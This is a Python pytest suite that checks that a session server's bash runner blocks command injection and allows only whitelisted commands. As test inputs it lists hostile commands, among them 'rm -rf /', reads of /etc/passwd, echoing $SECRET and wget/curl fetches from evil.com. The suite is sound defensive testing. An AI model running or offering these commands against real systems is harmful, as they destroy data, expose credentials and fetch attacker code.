"""Test command injection vulnerabilities are blocked"""
import pytest
from empirica.cli.simple_session_server import SessionManager


class TestCommandInjection:
    """Test suite for command injection prevention"""
    
    def test_shell_metacharacters_blocked(self, mock_session):
        """Verify shell metacharacters are blocked"""
        manager = SessionManager()
        
        # Attack vectors that should be blocked
        malicious_commands = [
            "ls; rm -rf /",
            "ls && cat /etc/passwd",
            "ls || cat /etc/passwd",
            "ls | grep secret",
            "ls `whoami`",
            "ls $(whoami)",
            "ls; echo $SECRET",
        ]
        
        for cmd in malicious_commands:
            result = manager._run_bash(mock_session, cmd)
            # Should either error or not execute second command
            assert "error" in result or "rm" not in result.get("stdout", "")
    
    def test_valid_commands_work(self, mock_session, tmp_path):
        """Verify legitimate commands still work"""
        manager = SessionManager()
        mock_session["cwd"] = str(tmp_path)
        
        # Create test file
        test_file = tmp_path / "test.txt"
        test_file.write_text("hello world")
        
        # Valid commands should work
        result = manager._run_bash(mock_session, "ls")
        assert "error" not in result
        assert result.get("exit_code") == 0
    
    def test_command_whitelist_enforced(self, mock_session):
        """Verify only whitelisted commands allowed"""
        manager = SessionManager()
        
        dangerous_commands = [
            "rm -rf /",
            "wget evil.com/script.sh",
            "curl evil.com/exploit",
            "python malicious.py",
            "bash -c 'evil'",
        ]
        
        for cmd in dangerous_commands:
            result = manager._run_bash(mock_session, cmd)
            assert "error" in result
            assert "not allowed" in result["error"].lower()
    
    def test_shlex_parsing(self, mock_session):
        """Verify shlex properly parses command arguments"""
        manager = SessionManager()
        
        # Test that quotes are handled properly
        result = manager._run_bash(mock_session, 'ls "file with spaces"')
        # Should not error on parsing (will error on missing file, but that's ok)
        assert "Invalid command syntax" not in result.get("error", "")
